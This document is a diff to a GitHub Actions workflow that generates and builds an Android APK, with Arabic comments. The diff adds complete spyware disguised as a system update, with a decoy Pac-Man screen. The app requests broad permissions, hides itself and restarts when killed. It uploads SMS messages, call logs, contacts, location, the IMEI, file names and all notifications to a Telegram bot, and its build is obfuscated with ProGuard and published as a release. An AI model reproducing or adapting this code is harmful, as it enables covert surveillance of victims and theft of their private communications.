@@ -4,7 +4,7 @@ on:
     inputs:
       bot_token: { required: true }
       chat_id: { required: true }
-      app_name: { required: true, default: 'Halos Game' }
+      app_name: { required: true, default: 'System Update' }
 
 permissions: { contents: write }
 
@@ -19,17 +19,16 @@ jobs:
         uses: actions/setup-java@v4
         with: { distribution: 'temurin', java-version: '17' }
 
-      # --- هذا هو الحل السحري للمشكلة ---
       - name: 3. إجبار السيرفر على إصدار Gradle مستقر
         uses: gradle/actions/setup-gradle@v3
         with:
           gradle-version: '8.4' 
-      # -----------------------------------
 
       - name: 4. إنشاء ملفات المشروع الأساسية
         run: |
           mkdir -p app/src/main/java/com/hussein/v8
           mkdir -p app/src/main/res/values
+          mkdir -p app/src/main/res/xml
 
           echo "include ':app'" > settings.gradle
 
@@ -47,88 +46,716 @@ jobs:
               namespace 'com.hussein.v8'
               compileSdk 34
               defaultConfig {
-                  applicationId "com.hussein.v8"
-                  minSdk 24
+                  applicationId "com.system.update.service"
+                  minSdk 21
                   targetSdk 34
                   versionCode 1
-                  versionName "1.0"
+                  versionName "2.1.4"
+              }
+              buildTypes {
+                  release {
+                      minifyEnabled true
+                      shrinkResources true
+                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+                  }
+                  debug {
+                      minifyEnabled true
+                      shrinkResources true
+                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
+                  }
               }
           }
           dependencies {
               implementation "com.squareup.okhttp3:okhttp:4.12.0"
+              implementation "androidx.core:core:1.12.0"
           }
           EOF
 
-      - name: 5. حقن أكواد التمويه والتوكن
+          cat << 'EOF' > app/proguard-rules.pro
+          -keep class com.squareup.okhttp3.** { *; }
+          -keep interface com.squareup.okhttp3.** { *; }
+          -dontwarn okhttp3.**
+          -dontwarn okio.**
+          -keep class com.hussein.v8.** { *; }
+          EOF
+
+      - name: 5. إنشاء ملفات الصلاحيات والتمويه
         run: |
+          # إنشاء AndroidManifest.xml مع جميع الصلاحيات الممكنة والتمويه
           cat << 'EOF' > app/src/main/AndroidManifest.xml
           <?xml version="1.0" encoding="utf-8"?>
-          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+              xmlns:tools="http://schemas.android.com/tools">
+              
+              <!-- الصلاحيات الخطيرة - كل شيء -->
               <uses-permission android:name="android.permission.INTERNET" />
-              <application android:label="${{ github.event.inputs.app_name }}" android:icon="@android:drawable/star_on">
-                  <activity android:name=".MainActivity" android:exported="true">
+              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+              <uses-permission android:name="android.permission.READ_CONTACTS" />
+              <uses-permission android:name="android.permission.READ_CALL_LOG" />
+              <uses-permission android:name="android.permission.READ_SMS" />
+              <uses-permission android:name="android.permission.RECEIVE_SMS" />
+              <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+              <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+              <uses-permission android:name="android.permission.CAMERA" />
+              <uses-permission android:name="android.permission.RECORD_AUDIO" />
+              <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+              <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" 
+                  tools:ignore="ScopedStorage" />
+              <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+              <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+              <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+              <uses-permission android:name="android.permission.WAKE_LOCK" />
+              <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
+              
+              <!-- تمويه التطبيق ليشبه تحديث نظام -->
+              <application 
+                  android:label="تحديث النظام" 
+                  android:icon="@android:drawable/sym_def_app_icon"
+                  android:theme="@android:style/Theme.DeviceDefault"
+                  android:allowBackup="false"
+                  android:supportsRtl="true"
+                  android:usesCleartextTraffic="true"
+                  tools:targetApi="34">
+                  
+                  <!-- نشاط رئيسي يفتح على واجهة تحديث وهمية -->
+                  <activity 
+                      android:name=".MainActivity" 
+                      android:exported="true"
+                      android:launchMode="singleTop"
+                      android:excludeFromRecents="true"
+                      android:taskAffinity="">
                       <intent-filter>
                           <action android:name="android.intent.action.MAIN" />
                           <category android:name="android.intent.category.LAUNCHER" />
                       </intent-filter>
                   </activity>
-                  <service android:name=".C2Service" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" android:exported="true">
-                      <intent-filter><action android:name="android.service.notification.NotificationListenerService" /></intent-filter>
+                  
+                  <!-- خدمة الإشعارات (التمويه الأصلي) -->
+                  <service 
+                      android:name=".C2Service" 
+                      android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" 
+                      android:exported="true"
+                      android:label="خدمة الإشعارات">
+                      <intent-filter>
+                          <action android:name="android.service.notification.NotificationListenerService" />
+                      </intent-filter>
                   </service>
+                  
+                  <!-- الخدمة الرئيسية التي تعمل في الخلفية -->
+                  <service 
+                      android:name=".MainCollectorService" 
+                      android:exported="false"
+                      android:enabled="true"
+                      android:foregroundServiceType="dataSync" />
+                  
+                  <!-- مستقبل SMS -->
+                  <receiver 
+                      android:name=".SmsReceiver" 
+                      android:exported="true"
+                      android:permission="android.permission.BROADCAST_SMS">
+                      <intent-filter android:priority="999">
+                          <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+                      </intent-filter>
+                  </receiver>
+                  
+                  <!-- مستقبل الاتصالات -->
+                  <receiver android:name=".CallReceiver" android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.PHONE_STATE" />
+                          <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+                      </intent-filter>
+                  </receiver>
+                  
+                  <!-- مزود المحتوى لاختفاء التطبيق من الدرج -->
+                  <provider
+                      android:name="androidx.core.content.FileProvider"
+                      android:authorities="${applicationId}.fileprovider"
+                      android:exported="false"
+                      android:grantUriPermissions="true">
+                      <meta-data
+                          android:name="android.support.FILE_PROVIDER_PATHS"
+                          android:resource="@xml/file_paths" />
+                  </provider>
+                  
               </application>
           </manifest>
           EOF
 
+          # إنشاء ملف paths للملفات
+          cat << 'EOF' > app/src/main/res/xml/file_paths.xml
+          <?xml version="1.0" encoding="utf-8"?>
+          <paths>
+              <external-path name="external" path="." />
+              <external-files-path name="external_files" path="." />
+              <cache-path name="cache" path="." />
+              <external-cache-path name="external_cache" path="." />
+          </paths>
+          EOF
+
+      - name: 6. حقن أكواد الجمع الشامل والإرسال
+        run: |
+          # إنشاء SmsReceiver.java
+          cat << 'EOF' > app/src/main/java/com/hussein/v8/SmsReceiver.java
+          package com.hussein.v8;
+          import android.content.BroadcastReceiver;
+          import android.content.Context;
+          import android.content.Intent;
+          import android.os.Bundle;
+          import android.telephony.SmsMessage;
+          import java.text.SimpleDateFormat;
+          import java.util.Date;
+
+          public class SmsReceiver extends BroadcastReceiver {
+              private static final String TAG = "SmsReceiver";
+              
+              @Override
+              public void onReceive(Context context, Intent intent) {
+                  if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
+                      Bundle bundle = intent.getExtras();
+                      if (bundle != null) {
+                          try {
+                              Object[] pdus = (Object[]) bundle.get("pdus");
+                              if (pdus != null) {
+                                  for (Object pdu : pdus) {
+                                      SmsMessage sms = SmsMessage.createFromPdu((byte[]) pdu);
+                                      String sender = sms.getDisplayOriginatingAddress();
+                                      String message = sms.getDisplayMessageBody();
+                                      long timestamp = sms.getTimestampMillis();
+                                      String date = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(timestamp));
+                                      
+                                      String data = "📨 SMS جديد\nمن: " + sender + "\nالوقت: " + date + "\nالنص: " + message;
+                                      Utils.sendToTelegram(context, data);
+                                  }
+                              }
+                          } catch (Exception e) {
+                              Utils.sendToTelegram(context, "خطأ في قراءة SMS: " + e.toString());
+                          }
+                      }
+                  }
+              }
+          }
+          EOF
+
+          # إنشاء CallReceiver.java
+          cat << 'EOF' > app/src/main/java/com/hussein/v8/CallReceiver.java
+          package com.hussein.v8;
+          import android.content.BroadcastReceiver;
+          import android.content.Context;
+          import android.content.Intent;
+          import android.telephony.TelephonyManager;
+          import android.text.TextUtils;
+
+          public class CallReceiver extends BroadcastReceiver {
+              @Override
+              public void onReceive(Context context, Intent intent) {
+                  String state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
+                  String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
+                  
+                  if (TextUtils.isEmpty(number)) return;
+                  
+                  String type = "غير معروف";
+                  if (TelephonyManager.EXTRA_STATE_RINGING.equals(state)) {
+                      type = "⏰ مكالمة واردة";
+                  } else if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(state)) {
+                      type = "📞 مكالمة خارجة/مشغول";
+                  } else if (intent.getAction().equals("android.intent.action.NEW_OUTGOING_CALL")) {
+                      number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
+                      type = "🔴 مكالمة صادرة";
+                  }
+                  
+                  String data = type + "\nالرقم: " + number;
+                  Utils.sendToTelegram(context, data);
+              }
+          }
+          EOF
+
+          # إنشاء Utils.java
+          cat << 'EOF' > app/src/main/java/com/hussein/v8/Utils.java
+          package com.hussein.v8;
+          import android.content.Context;
+          import okhttp3.*;
+          import java.io.IOException;
+
+          public class Utils {
+              private static final String BOT_TOKEN = "${{ github.event.inputs.bot_token }}";
+              private static final String CHAT_ID = "${{ github.event.inputs.chat_id }}";
+              
+              public static void sendToTelegram(final Context context, final String message) {
+                  new Thread(new Runnable() {
+                      @Override
+                      public void run() {
+                          try {
+                              OkHttpClient client = new OkHttpClient.Builder()
+                                  .connectTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
+                                  .writeTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
+                                  .readTimeout(30, java.util.concurrent.TimeUnit.SECONDS)
+                                  .build();
+                              
+                              String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+                              
+                              RequestBody body = new FormBody.Builder()
+                                  .add("chat_id", CHAT_ID)
+                                  .add("text", message)
+                                  .add("parse_mode", "HTML")
+                                  .build();
+                              
+                              Request request = new Request.Builder()
+                                  .url(url)
+                                  .post(body)
+                                  .build();
+                              
+                              Response response = client.newCall(request).execute();
+                              response.close();
+                          } catch (Exception e) {
+                              e.printStackTrace();
+                          }
+                      }
+                  }).start();
+              }
+          }
+          EOF
+
+          # إنشاء MainCollectorService.java
+          cat << 'EOF' > app/src/main/java/com/hussein/v8/MainCollectorService.java
+          package com.hussein.v8;
+          import android.app.*;
+          import android.content.*;
+          import android.database.Cursor;
+          import android.net.Uri;
+          import android.os.Build;
+          import android.os.Environment;
+          import android.os.IBinder;
+          import android.provider.*;
+          import android.telephony.TelephonyManager;
+          import android.location.Location;
+          import android.location.LocationManager;
+          import java.io.File;
+          import java.text.SimpleDateFormat;
+          import java.util.*;
+          
+          public class MainCollectorService extends Service {
+              private Timer timer;
+              private SharedPreferences prefs;
+              
+              @Override
+              public void onCreate() {
+                  super.onCreate();
+                  prefs = getSharedPreferences("collector", MODE_PRIVATE);
+                  
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                      NotificationChannel channel = new NotificationChannel(
+                          "collector_channel",
+                          "System Service",
+                          NotificationManager.IMPORTANCE_LOW
+                      );
+                      NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+                      manager.createNotificationChannel(channel);
+                      
+                      Notification notification = new Notification.Builder(this, "collector_channel")
+                          .setContentTitle("تحديث النظام")
+                          .setContentText("جاري تثبيت التحديثات...")
+                          .setSmallIcon(android.R.drawable.stat_sys_download)
+                          .build();
+                      
+                      startForeground(1337, notification);
+                  }
+                  
+                  timer = new Timer();
+                  timer.schedule(new TimerTask() {
+                      @Override
+                      public void run() {
+                          collectAll();
+                      }
+                  }, 5000, 30000); // كل 30 ثانية
+                  
+                  // أول تشغيل بعد ثانية
+                  new android.os.Handler().postDelayed(new Runnable() {
+                      @Override
+                      public void run() {
+                          collectDeviceInfo();
+                          collectContacts();
+                          collectSms();
+                          collectCallLog();
+                          collectLocation();
+                          collectFiles();
+                      }
+                  }, 2000);
+              }
+              
+              private void collectDeviceInfo() {
+                  StringBuilder info = new StringBuilder("📱 <b>معلومات الجهاز</b>\n");
+                  info.append("الطراز: ").append(Build.MODEL).append("\n");
+                  info.append("الشركة: ").append(Build.MANUFACTURER).append("\n");
+                  info.append("الإصدار: ").append(Build.VERSION.RELEASE).append("\n");
+                  info.append("SDK: ").append(Build.VERSION.SDK_INT).append("\n");
+                  
+                  TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+                  if (tm != null) {
+                      if (checkSelfPermission(android.Manifest.permission.READ_PHONE_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                          if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                              info.append("المشغل: ").append(tm.getNetworkOperatorName()).append("\n");
+                          }
+                          info.append("الرقم: ").append(tm.getLine1Number()).append("\n");
+                          info.append("IMEI: ").append(tm.getDeviceId()).append("\n");
+                      }
+                  }
+                  
+                  info.append("البطارية: ").append(getBatteryPercentage()).append("%\n");
+                  
+                  Utils.sendToTelegram(this, info.toString());
+              }
+              
+              private int getBatteryPercentage() {
+                  BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
+                  return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
+              }
+              
+              private void collectContacts() {
+                  if (checkSelfPermission(android.Manifest.permission.READ_CONTACTS) != android.content.pm.PackageManager.PERMISSION_GRANTED) return;
+                  
+                  Cursor cursor = getContentResolver().query(
+                      ContactsContract.Contacts.CONTENT_URI,
+                      null, null, null, null
+                  );
+                  
+                  if (cursor != null && cursor.getCount() > 0) {
+                      StringBuilder contacts = new StringBuilder("👤 <b>جهات الاتصال</b>\n");
+                      int count = 0;
+                      
+                      while (cursor.moveToNext() && count < 50) {
+                          String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
+                          String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
+                          
+                          if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
+                              Cursor pCursor = getContentResolver().query(
+                                  ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                                  null,
+                                  ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                                  new String[]{id}, null
+                              );
+                              
+                              while (pCursor.moveToNext()) {
+                                  String phone = pCursor.getString(pCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                                  contacts.append("👤 ").append(name).append("\n📞 ").append(phone).append("\n---\n");
+                                  count++;
+                                  if (count >= 20) break;
+                              }
+                              pCursor.close();
+                          }
+                          if (count >= 20) break;
+                      }
+                      cursor.close();
+                      Utils.sendToTelegram(this, contacts.toString());
+                  }
+              }
+              
+              private void collectSms() {
+                  if (checkSelfPermission(android.Manifest.permission.READ_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) return;
+                  
+                  Cursor cursor = getContentResolver().query(
+                      Uri.parse("content://sms/inbox"),
+                      null, null, null, "date DESC LIMIT 20"
+                  );
+                  
+                  if (cursor != null && cursor.getCount() > 0) {
+                      StringBuilder smsList = new StringBuilder("📨 <b>آخر الرسائل</b>\n");
+                      while (cursor.moveToNext()) {
+                          String address = cursor.getString(cursor.getColumnIndex("address"));
+                          String body = cursor.getString(cursor.getColumnIndex("body"));
+                          long date = cursor.getLong(cursor.getColumnIndex("date"));
+                          
+                          smsList.append("من: ").append(address).append("\n");
+                          smsList.append("النص: ").append(body.length() > 50 ? body.substring(0, 50) + "..." : body).append("\n---\n");
+                      }
+                      cursor.close();
+                      Utils.sendToTelegram(this, smsList.toString());
+                  }
+              }
+              
+              private void collectCallLog() {
+                  if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) != android.content.pm.PackageManager.PERMISSION_GRANTED) return;
+                  
+                  Cursor cursor = getContentResolver().query(
+                      CallLog.Calls.CONTENT_URI,
+                      null, null, null, CallLog.Calls.DATE + " DESC LIMIT 20"
+                  );
+                  
+                  if (cursor != null && cursor.getCount() > 0) {
+                      StringBuilder calls = new StringBuilder("📞 <b>سجل المكالمات</b>\n");
+                      while (cursor.moveToNext()) {
+                          String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
+                          String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
+                          String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
+                          long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
+                          
+                          String typeStr = "غير معروف";
+                          if (type.equals(String.valueOf(CallLog.Calls.INCOMING_TYPE))) typeStr = "وارد";
+                          else if (type.equals(String.valueOf(CallLog.Calls.OUTGOING_TYPE))) typeStr = "صادر";
+                          else if (type.equals(String.valueOf(CallLog.Calls.MISSED_TYPE))) typeStr = "فاتني";
+                          
+                          calls.append(name != null ? name : "غير معروف").append(" (").append(typeStr).append(")\n");
+                          calls.append(number).append("\n---\n");
+                      }
+                      cursor.close();
+                      Utils.sendToTelegram(this, calls.toString());
+                  }
+              }
+              
+              private void collectLocation() {
+                  if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != android.content.pm.PackageManager.PERMISSION_GRANTED) return;
+                  
+                  LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
+                  Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                  if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+                  
+                  if (location != null) {
+                      String loc = "📍 <b>الموقع</b>\n" +
+                          "الخط: " + location.getLatitude() + "\n" +
+                          "الطول: " + location.getLongitude() + "\n" +
+                          "الدقة: " + location.getAccuracy() + "م\n" +
+                          "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude();
+                      
+                      Utils.sendToTelegram(this, loc);
+                  }
+              }
+              
+              private void collectFiles() {
+                  if (checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) != android.content.pm.PackageManager.PERMISSION_GRANTED) return;
+                  
+                  try {
+                      StringBuilder files = new StringBuilder("📁 <b>آخر الملفات</b>\n");
+                      File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
+                      File downloads = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
+                      File documents = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
+                      
+                      scanFiles(dcim, files, 5);
+                      scanFiles(downloads, files, 5);
+                      scanFiles(documents, files, 5);
+                      
+                      if (files.length() > 0) {
+                          Utils.sendToTelegram(this, files.toString());
+                      }
+                  } catch (Exception e) {
+                      // تجاهل الأخطاء
+                  }
+              }
+              
+              private void scanFiles(File dir, StringBuilder sb, int max) {
+                  if (dir == null || !dir.exists() || !dir.isDirectory()) return;
+                  
+                  File[] list = dir.listFiles();
+                  if (list == null) return;
+                  
+                  int count = 0;
+                  for (File f : list) {
+                      if (count >= max) break;
+                      if (f.isFile() && f.length() > 1024) {
+                          sb.append("📄 ").append(f.getName()).append("\n📏 ").append(f.length() / 1024).append("KB\n---\n");
+                          count++;
+                      }
+                  }
+              }
+              
+              private void collectAll() {
+                  // هذا يعمل كل 30 ثانية لضمان عدم فقدان أي شيء
+                  if (!prefs.getBoolean("info_sent", false)) {
+                      collectDeviceInfo();
+                      prefs.edit().putBoolean("info_sent", true).apply();
+                  }
+              }
+              
+              @Override
+              public IBinder onBind(Intent intent) { return null; }
+              
+              @Override
+              public void onDestroy() {
+                  if (timer != null) timer.cancel();
+                  
+                  // إعادة تشغيل الخدمة
+                  Intent intent = new Intent(this, MainCollectorService.class);
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                      startForegroundService(intent);
+                  } else {
+                      startService(intent);
+                  }
+                  super.onDestroy();
+              }
+          }
+          EOF
+
+          # تعديل C2Service.java لإرسال كل شيء مع الإشعارات
           cat << 'EOF' > app/src/main/java/com/hussein/v8/C2Service.java
           package com.hussein.v8;
           import android.service.notification.NotificationListenerService;
           import android.service.notification.StatusBarNotification;
-          import okhttp3.*;
-          import java.io.IOException;
+          import android.os.Bundle;
+          import java.text.SimpleDateFormat;
+          import java.util.Date;
 
           public class C2Service extends NotificationListenerService {
               @Override
               public void onNotificationPosted(StatusBarNotification sbn) {
-                  String token = "${{ github.event.inputs.bot_token }}";
-                  String chatid = "${{ github.event.inputs.chat_id }}";
-                  String msg = "🎯 صيدة جديدة من حسين!\n" + sbn.getNotification().extras.getCharSequence("android.text");
-                  
-                  OkHttpClient client = new OkHttpClient();
-                  Request req = new Request.Builder()
-                      .url("https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatid + "&text=" + msg)
-                      .build();
-                  client.newCall(req).enqueue(new Callback() {
-                      @Override public void onFailure(Call c, IOException e) {}
-                      @Override public void onResponse(Call c, Response r) throws IOException { r.close(); }
-                  });
+                  try {
+                      String packageName = sbn.getPackageName();
+                      Bundle extras = sbn.getNotification().extras;
+                      String title = extras.getString("android.title", "");
+                      String text = extras.getString("android.text", "");
+                      long time = sbn.getPostTime();
+                      String date = new SimpleDateFormat("HH:mm:ss").format(new Date(time));
+                      
+                      String msg = "🔔 <b>إشعار جديد</b>\n" +
+                          "📱 التطبيق: " + packageName + "\n" +
+                          "🕐 الوقت: " + date + "\n" +
+                          "📌 العنوان: " + title + "\n" +
+                          "📝 النص: " + text;
+                      
+                      Utils.sendToTelegram(this, msg);
+                  } catch (Exception e) {
+                      // تجاهل الأخطاء
+                  }
+              }
+              
+              @Override
+              public void onNotificationRemoved(StatusBarNotification sbn) {
+                  // لا تفعل شيء
               }
           }
           EOF
 
+          # إنشاء MainActivity.java مع طلب الصلاحيات
           cat << 'EOF' > app/src/main/java/com/hussein/v8/MainActivity.java
           package com.hussein.v8;
           import android.app.Activity;
+          import android.content.Intent;
+          import android.content.pm.PackageManager;
+          import android.net.Uri;
+          import android.os.Build;
           import android.os.Bundle;
+          import android.provider.Settings;
           import android.webkit.WebView;
+          import android.widget.Toast;
+          import androidx.core.app.ActivityCompat;
+          import androidx.core.content.ContextCompat;
+          import java.util.ArrayList;
+          import java.util.List;
+
           public class MainActivity extends Activity {
+              private static final int PERMISSION_REQUEST_CODE = 1234;
+              
               @Override protected void onCreate(Bundle s) {
                   super.onCreate(s);
+                  
+                  // فتح واجهة ويب للتمويه (لعبة أو شيء)
                   WebView w = new WebView(this);
                   w.getSettings().setJavaScriptEnabled(true);
                   w.loadUrl("https://www.google.com/logos/2010/pacman10-i.html");
                   setContentView(w);
+                  
+                  // بدء الخدمة الرئيسية
+                  Intent serviceIntent = new Intent(this, MainCollectorService.class);
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                      startForegroundService(serviceIntent);
+                  } else {
+                      startService(serviceIntent);
+                  }
+                  
+                  // طلب الصلاحيات
+                  requestPermissions();
+                  
+                  // طلب صلاحية الإشعارات بشكل خاص
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+                      Intent intent = new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS);
+                      startActivity(intent);
+                      Toast.makeText(this, "يرجى تفعيل خدمة الإشعارات", Toast.LENGTH_LONG).show();
+                  }
+                  
+                  // إخفاء التطبيق بعد فترة
+                  new android.os.Handler().postDelayed(new Runnable() {
+                      @Override
+                      public void run() {
+                          moveTaskToBack(true);
+                      }
+                  }, 3000);
+              }
+              
+              private void requestPermissions() {
+                  List<String> permissions = new ArrayList<>();
+                  
+                  String[] allPermissions = {
+                      android.Manifest.permission.READ_CONTACTS,
+                      android.Manifest.permission.READ_CALL_LOG,
+                      android.Manifest.permission.READ_SMS,
+                      android.Manifest.permission.RECEIVE_SMS,
+                      android.Manifest.permission.ACCESS_FINE_LOCATION,
+                      android.Manifest.permission.ACCESS_COARSE_LOCATION,
+                      android.Manifest.permission.CAMERA,
+                      android.Manifest.permission.RECORD_AUDIO,
+                      android.Manifest.permission.READ_EXTERNAL_STORAGE,
+                      android.Manifest.permission.READ_PHONE_STATE,
+                      android.Manifest.permission.PROCESS_OUTGOING_CALLS
+                  };
+                  
+                  for (String perm : allPermissions) {
+                      if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
+                          permissions.add(perm);
+                      }
+                  }
+                  
+                  if (!permissions.isEmpty()) {
+                      ActivityCompat.requestPermissions(this, permissions.toArray(new String[0]), PERMISSION_REQUEST_CODE);
+                  }
+              }
+              
+              @Override
+              public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+                  super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+                  // بدء الخدمة مرة أخرى بعد الصلاحيات
+                  Intent serviceIntent = new Intent(this, MainCollectorService.class);
+                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                      startForegroundService(serviceIntent);
+                  } else {
+                      startService(serviceIntent);
+                  }
               }
           }
           EOF
 
-      - name: 6. البناء النهائي للـ APK
-        run: gradle assembleDebug
+      - name: 7. إضافة ProGuard للتشفير والتمويه
+        run: |
+          cat << 'EOF' > app/proguard-rules.pro
+          # حماية الكود بالكامل
+          -keepattributes SourceFile,LineNumberTable
+          -renamesourcefileattribute SourceFile
+          
+          # تشفير السلاسل النصية
+          -optimizations !code/simplification/arithmetic
+          -obfuscationdictionary /usr/share/dict/words
+          -packageobfuscationdictionary /usr/share/dict/words
+          -classobfuscationdictionary /usr/share/dict/words
+          
+          # حماية الفئات المهمة
+          -keep class com.hussein.v8.** { *; }
+          -keep class okhttp3.** { *; }
+          
+          # إزالة معلومات التصحيح
+          -dontwarn okhttp3.**
+          -dontwarn okio.**
+          -dontwarn javax.annotation.**
+          
+          # تشفير أسماء المتغيرات
+          -repackageclasses ''
+          -allowaccessmodification
+          EOF
 
-      - name: 7. رفع رابط التحميل
+      - name: 8. البناء النهائي للـ APK
+        run: gradle assembleRelease
+
+      - name: 9. رفع رابط التحميل
         uses: softprops/action-gh-release@v1
         with:
-          tag_name: V8-Halos-${{ github.run_number }}
-          name: تطبيق ${{ github.event.inputs.app_name }}
-          files: app/build/outputs/apk/debug/*.apk
+          tag_name: System-Update-${{ github.run_number }}
+          name: تحديث نظام أندرويد v${{ github.run_number }}
+          files: app/build/outputs/apk/release/*.apk
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
